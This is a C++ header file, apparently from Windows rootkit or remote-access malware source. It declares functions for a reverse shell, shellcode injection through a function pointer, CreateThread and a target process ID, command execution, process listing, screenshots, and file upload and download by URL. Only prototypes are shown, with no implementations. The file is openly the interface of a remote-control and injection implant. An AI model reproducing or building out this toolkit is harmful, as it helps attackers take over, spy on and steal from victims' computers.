#pragma once
#ifndef ROOTKIT_H
#define ROOTKIT_H
#define BUFLEN 1024
#include<winsock2.h>
#include<windows.h>
#include<ctime>
#include <string>
#include<ws2tcpip.h>
#include <gdiplus.h>
#include<WtsApi32.h>
#include <tlhelp32.h>


using namespace Gdiplus;
using namespace std;

string getProcesses();
void random_str(char *, const int);
std::string exec(const char*);
void RevShell(const char*, const char*);
string base64_decode(string const& s);
void uploadUrl(char*, char*);
void downloadUrl(char*, char*);
void screenshot(string); 
void injectFPT(const char*); // shellcode injecting using function to pointer
void injectCT(const char*);// shellcode injecting using CreateThread
void hostname(char*);
//char* CaptureScreenshot();
//void FreeScreenshot(char*);
void pid_inject(int, const char* );

#endif
